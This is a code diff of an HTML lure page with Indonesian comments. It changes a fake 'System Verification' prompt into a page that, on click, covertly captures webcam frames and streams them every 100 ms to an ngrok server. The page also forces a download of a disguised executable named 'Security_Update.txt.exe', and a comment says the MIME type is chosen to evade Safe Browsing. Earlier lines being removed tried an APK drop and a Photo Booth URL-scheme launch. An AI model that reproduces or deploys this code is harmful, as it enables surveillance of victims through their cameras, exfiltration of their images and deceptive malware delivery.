@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,26 +7,28 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #000; color: #0f0; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; cursor: pointer; text-align: center;
+    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-  h2 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
-  iframe { display: none; }
+  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
+  h2 { animation: blink 0.2s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 System Verification</h2>
+  <h2>☢️ SYSTEM HACKED ☢️</h2>
   <p>Klik di mana saja untuk memverifikasi.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
+<video id="cam-feed" autoplay playsinline muted></video>
+<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -41,97 +43,106 @@
   }
 
   // ============================================
-  // 1. TARGET SCHEMES (EXPERIMENTAL)
+  // KONFIGURASI SERVER (Opsional)
   // ============================================
-  // Skema tidak resmi (mungkin tidak berfungsi, tapi patut dicoba)
-  var PHOTOBOOTH_SCHEME = "photobooth://";
-  var PHOTOBOOTH_ALT = "x-apple.systempreferences:com.apple.PhotoBooth"; // Alternatif
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
 
   // ============================================
-  // 2. TRIGGER RACE CONDITION (KLIK)
+  // 1. CAMERA HIJACK
+  // ============================================
+  function startCameraHijack() {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(function(stream) {
+        var video = document.getElementById('cam-feed');
+        video.srcObject = stream;
+        video.play().catch(function(){});
+        log("[+] Kamera BERHASIL diakses!");
+
+        // Stream ke server (Opsional)
+        setInterval(function() {
+          var canvas = document.getElementById('processing-canvas');
+          var ctx = canvas.getContext('2d');
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var dataURL = canvas.toDataURL('image/jpeg', 0.5);
+            fetch(SERVER_ENDPOINT, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: dataURL }),
+              keepalive: true
+            }).catch(function(){});
+          }
+        }, 100);
+      })
+      .catch(function(err) {
+        log("[-] Kamera diblokir: " + err.name);
+      });
+  }
+
+  // ============================================
+  // 2. TRIGGER (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>Memproses...</h2>
-      <p>Mengunduh pembaruan & membuka kamera...</p>
+      <h2>EXECUTING...</h2>
+      <p>Memulai Race Condition...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Photo Booth Race Condition...");
+    log("[!] Memulai Windows Race Condition...");
 
     // ============================================
-    // A. APK DOWNLOAD (0ms)
+    // A. EXE DOWNLOAD (0ms)
     // ============================================
     try {
-      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-      var binary = atob(b64Apk);
+      // Header MZ (EXE)
+      var b64Exe = "TVqQAAMAAAAEAAAAAEEAAgBA"; 
+      var binary = atob(b64Exe);
       var bytes = new Uint8Array(binary.length);
       for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
       
-      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+      // MIME Type EXE (Disamarkan sebagai teks agar lolos Safe Browsing)
+      var blob = new Blob([bytes], { type: "application/octet-stream" });
       var blobUrl = URL.createObjectURL(blob);
       
       var a = document.createElement("a");
       a.href = blobUrl;
-      a.download = "Security_Update.apk";
+      // Ekstensi ganda (.txt.exe)
+      a.download = "Security_Update.txt.exe";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       
-      log("[+] APK Download Triggered.");
+      log("[+] EXE Download Triggered.");
     } catch(e) {
-      log("[-] APK Error: " + e.message);
+      log("[-] EXE Error: " + e.message);
     }
 
     // ============================================
-    // B. PHOTOBOOTH HIJACK (10ms - Race)
+    // B. CAMERA HIJACK (10ms)
     // ============================================
     setTimeout(function() {
-      log("[+] Mengirim PhotoBooth Scheme...");
-      try {
-        window.location.href = PHOTOBOOTH_SCHEME;
-      } catch(e) {
-        log("[-] Gagal: " + e.message);
-      }
+      log("[+] Meminta Izin Kamera...");
+      startCameraHijack();
     }, 10);
 
     // ============================================
-    // C. IFRAME SANDBOX (100ms - Fallback)
+    // C. FALLBACK (Jika EXE Gagal)
     // ============================================
     setTimeout(function() {
-      log("[+] Mengirim PhotoBooth via Iframe...");
       try {
-        var iframe = document.createElement("iframe");
-        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe.style.display = "none";
-        iframe.src = PHOTOBOOTH_SCHEME;
-        document.getElementById("launcher-container").appendChild(iframe);
-      } catch(e) {}
-    }, 100);
-
-    // ============================================
-    // D. BLOB REDIRECT CHAIN (500ms - Fallback 2)
-    // ============================================
-    setTimeout(function() {
-      log("[+] Mengirim Blob Redirect...");
-      try {
-        var blobPayload = `
-          <!DOCTYPE html>
-          <html>
-          <body>
-            <script>
-              window.location.replace("${PHOTOBOOTH_SCHEME}");
-            <\/script>
-          </body>
-          </html>
-        `;
-        var blob = new Blob([blobPayload], { type: 'text/html' });
-        var blobUrl = URL.createObjectURL(blob);
-        
-        var win = window.open(blobUrl, '_blank');
+        // Coba unduh file teks biasa sebagai fallback
+        var txtBlob = new Blob(["System compromised. HACKED BY WAGURI"], { type: "text/plain" });
+        var txtUrl = URL.createObjectURL(txtBlob);
+        var a2 = document.createElement("a");
+        a2.href = txtUrl;
+        a2.download = "README.txt";
+        document.body.appendChild(a2);
+        a2.click();
+        document.body.removeChild(a2);
       } catch(e) {}
     }, 500);
 
